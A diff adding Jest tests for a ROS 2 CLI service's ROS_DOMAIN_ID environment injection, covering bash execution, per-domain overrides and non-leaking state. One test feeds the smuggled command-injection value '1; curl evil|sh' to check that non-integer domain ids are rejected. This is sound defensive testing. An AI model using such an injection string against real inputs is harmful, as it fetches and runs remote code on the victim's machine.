@@ -216,4 +216,159 @@ describe('Ros2CliService exec-backed methods', () => {
   it('callService returns null when the command fails', async () => {
     await expect(cli.callService('/add_two_ints', 'example_interfaces/srv/AddTwoInts', '{"a": 1, "b": 2}')).resolves.toBeNull();
   });
+
+  describe('ROS_DOMAIN_ID injection', () => {
+    afterEach(() => {
+      cli.setDomainId(undefined);
+    });
+
+    function lastExecOptions(): Record<string, unknown> | undefined {
+      const calls = (exec as unknown as jest.Mock).mock.calls;
+      return calls[calls.length - 1]?.[1] as Record<string, unknown> | undefined;
+    }
+
+    it('runs exec commands under bash so sourced setup.bash scripts work', async () => {
+      mockStdout('/talker\n');
+      await cli.getActiveNodes();
+
+      // ROS setup.bash scripts use bash features (Bad substitution under
+      // dash), so hidden execs that source them must run under bash.
+      const options = lastExecOptions();
+      expect(options?.shell).toBe('/bin/bash');
+    });
+
+    it('executes without a ROS_DOMAIN_ID env key when unset', async () => {
+      cli.setDomainId(undefined);
+      mockStdout('/talker\n');
+      await cli.getActiveNodes();
+
+      const options = lastExecOptions();
+      const env = options?.env as Record<string, string | undefined> | undefined;
+      expect(env).toBeDefined();
+      expect(env?.ROS_DOMAIN_ID).toBeUndefined();
+      expect(env?.PATH).toBe(process.env.PATH);
+    });
+
+    it('injects env.ROS_DOMAIN_ID on every exec when set', async () => {
+      cli.setDomainId(2);
+      mockStdout('/talker\n');
+      await cli.getActiveNodes();
+      mockStdout('/chatter\n');
+      await cli.getActiveTopics();
+      mockStdout('Type: std_msgs/msg/String\nPublisher count: 0\nSubscription count: 0\n');
+      await cli.getTopicInfo('/chatter');
+      mockStdout('/talker\n publishers:\n');
+      await cli.getNodeInfo('/talker');
+      mockStdout('/chatter\n');
+      await cli.getParameterNames('/talker');
+
+      const calls = (exec as unknown as jest.Mock).mock.calls;
+      expect(calls.length).toBe(5);
+      for (const call of calls) {
+        const env = (call[1] as { env?: Record<string, string | undefined> }).env;
+        expect(env?.ROS_DOMAIN_ID).toBe('2');
+        expect(env?.PATH).toBe(process.env.PATH);
+      }
+    });
+
+    it('reverts to unmodified env after setDomainId(undefined)', async () => {
+      cli.setDomainId(5);
+      cli.setDomainId(undefined);
+      mockStdout('/talker\n');
+      await cli.getActiveNodes();
+
+      const options = (exec as unknown as jest.Mock).mock.calls[0][1] as { env: Record<string, string | undefined> };
+      expect(options.env.ROS_DOMAIN_ID).toBeUndefined();
+    });
+
+    it('ignores non-integer domain ids from settings', async () => {
+      // A hostile workspace configuration can set ramros.ros.domainId to a
+      // string; passing it verbatim into the shell would be injection.
+      const hostile = '1; curl evil|sh' as unknown as number;
+      cli.setDomainId(hostile);
+      mockStdout('/talker\n');
+      await cli.getActiveNodes();
+
+      const env = ((exec as unknown as jest.Mock).mock.calls[0][1] as { env: Record<string, string | undefined> }).env;
+      expect(env?.ROS_DOMAIN_ID).toBeUndefined();
+    });
+
+    it('getActiveNodesForDomain uses the given domain regardless of the global default', async () => {
+      cli.setDomainId(2);
+      mockStdout('/n7\n');
+      await cli.getActiveNodesForDomain(7);
+      const env = ((exec as unknown as jest.Mock).mock.calls[0][1] as { env: Record<string, string> }).env;
+      expect(env.ROS_DOMAIN_ID).toBe('7');
+      cli.setDomainId(undefined);
+    });
+
+    it('getActiveTopicsForDomain uses the given domain regardless of the global default', async () => {
+      cli.setDomainId(undefined);
+      mockStdout('/t7\n');
+      await cli.getActiveTopicsForDomain(7);
+      const env = ((exec as unknown as jest.Mock).mock.calls[0][1] as { env: Record<string, string> }).env;
+      expect(env.ROS_DOMAIN_ID).toBe('7');
+    });
+
+    it('getNodeInfoForDomain uses the given domain regardless of the global default', async () => {
+      cli.setDomainId(2);
+      mockStdout('/talker\n publishers:\n');
+      await cli.getNodeInfoForDomain('/talker', 7);
+      const env = ((exec as unknown as jest.Mock).mock.calls[0][1] as { env: Record<string, string> }).env;
+      expect(env.ROS_DOMAIN_ID).toBe('7');
+      cli.setDomainId(undefined);
+    });
+
+    it('getTopicInfoForDomain uses the given domain regardless of the global default', async () => {
+      cli.setDomainId(undefined);
+      mockStdout('Type: std_msgs/msg/String\nPublisher count: 0\nSubscription count: 0\n');
+      await cli.getTopicInfoForDomain('/chatter', 9);
+      const env = ((exec as unknown as jest.Mock).mock.calls[0][1] as { env: Record<string, string> }).env;
+      expect(env.ROS_DOMAIN_ID).toBe('9');
+    });
+
+    it('getTopicPublishersForDomain uses the given domain regardless of the global default', async () => {
+      cli.setDomainId(2);
+      mockStdout('Type: std_msgs/msg/String\nPublisher count: 1\nNode name: pub7\n');
+      const endpoints = await cli.getTopicPublishersForDomain('/chatter', 7);
+      const env = ((exec as unknown as jest.Mock).mock.calls[0][1] as { env: Record<string, string> }).env;
+      expect(env.ROS_DOMAIN_ID).toBe('7');
+      expect(endpoints).toEqual([{ nodeName: 'pub7', nodeNamespace: '' }]);
+      cli.setDomainId(undefined);
+    });
+
+    it('getTopicSubscribersForDomain uses the given domain regardless of the global default', async () => {
+      cli.setDomainId(undefined);
+      mockStdout('Type: std_msgs/msg/String\nPublisher count: 0\nSubscription count: 1\nNode name: sub9\n');
+      const endpoints = await cli.getTopicSubscribersForDomain('/chatter', 9);
+      const env = ((exec as unknown as jest.Mock).mock.calls[0][1] as { env: Record<string, string> }).env;
+      expect(env.ROS_DOMAIN_ID).toBe('9');
+      expect(endpoints).toEqual([{ nodeName: 'sub9', nodeNamespace: '' }]);
+    });
+
+    it('ForDomain info calls do not leak the override into later default calls', async () => {
+      // The tick refreshes expanded items from several domains concurrently;
+      // a save/mutate/restore on shared state would interleave and mislabel
+      // calls, so the override must travel with the exec options instead.
+      cli.setDomainId(2);
+      mockStdout('/n7\n publishers:\n');
+      await cli.getNodeInfoForDomain('/n7', 7);
+      mockStdout('/talker\n publishers:\n');
+      await cli.getNodeInfo('/talker');
+      const envs = (exec as unknown as jest.Mock).mock.calls.map(
+        (call: unknown[]) => (call[1] as { env: Record<string, string> }).env.ROS_DOMAIN_ID
+      );
+      expect(envs).toEqual(['7', '2']);
+      cli.setDomainId(undefined);
+    });
+
+    it('executeLines routes a raw command through the central env injection', async () => {
+      cli.setDomainId(3);
+      mockStdout('/a\n/b\n');
+      await expect(cli.executeLines('ros2 topic list')).resolves.toEqual(['/a', '/b']);
+      const env = ((exec as unknown as jest.Mock).mock.calls[0][1] as { env: Record<string, string> }).env;
+      expect(env.ROS_DOMAIN_ID).toBe('3');
+      cli.setDomainId(undefined);
+    });
+  });
 });
